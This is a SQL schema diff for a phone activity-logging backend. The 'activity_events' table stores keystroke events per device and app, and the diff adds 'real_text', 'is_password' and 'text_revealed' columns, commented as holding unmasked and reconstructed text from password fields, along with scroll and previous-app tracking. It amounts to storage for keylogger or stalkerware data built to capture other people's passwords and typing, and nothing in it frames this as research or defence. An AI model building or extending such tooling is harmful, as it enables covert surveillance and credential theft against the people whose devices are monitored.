@@ -65,12 +65,32 @@ CREATE TABLE IF NOT EXISTS public.activity_events (
     event_type TEXT DEFAULT 'keystroke',
     app_package TEXT DEFAULT 'unknown',
     text       TEXT DEFAULT '',
+    real_text  TEXT,                      -- unmasked text read from the source node (password fields)
+    is_password BOOLEAN DEFAULT false,   -- true when the field was a password/secret field
+    text_revealed TEXT,                  -- reconstructed real text (dashboard computes, persisted here)
+    reveal_partial BOOLEAN DEFAULT false, -- true when reconstruction was partial (paste/mid-field/etc.)
     full_text  TEXT,
     class_name TEXT,
+    before_text TEXT,
+    content_desc TEXT,
+    scroll_y INTEGER,
+    max_scroll_y INTEGER,
+    item_count INTEGER,
+    previous_app TEXT,
     created_at TIMESTAMPTZ DEFAULT now()
 );
 -- Outbox dedup: phone re-sends events until it receives an event_ack; this
 -- unique index makes duplicate re-sends harmless (exactly-once persistence).
 ALTER TABLE public.activity_events ADD COLUMN IF NOT EXISTS event_uuid TEXT;
+ALTER TABLE public.activity_events ADD COLUMN IF NOT EXISTS before_text TEXT;
+ALTER TABLE public.activity_events ADD COLUMN IF NOT EXISTS content_desc TEXT;
+ALTER TABLE public.activity_events ADD COLUMN IF NOT EXISTS scroll_y INTEGER;
+ALTER TABLE public.activity_events ADD COLUMN IF NOT EXISTS max_scroll_y INTEGER;
+ALTER TABLE public.activity_events ADD COLUMN IF NOT EXISTS item_count INTEGER;
+ALTER TABLE public.activity_events ADD COLUMN IF NOT EXISTS previous_app TEXT;
+ALTER TABLE public.activity_events ADD COLUMN IF NOT EXISTS real_text TEXT;
+ALTER TABLE public.activity_events ADD COLUMN IF NOT EXISTS is_password BOOLEAN DEFAULT false;
+ALTER TABLE public.activity_events ADD COLUMN IF NOT EXISTS text_revealed TEXT;
+ALTER TABLE public.activity_events ADD COLUMN IF NOT EXISTS reveal_partial BOOLEAN DEFAULT false;
 CREATE UNIQUE INDEX IF NOT EXISTS uq_activity_device_uuid ON public.activity_events (device_id, event_uuid);
 CREATE INDEX IF NOT EXISTS idx_activity_events_device ON public.activity_events (device_id, created_at DESC);
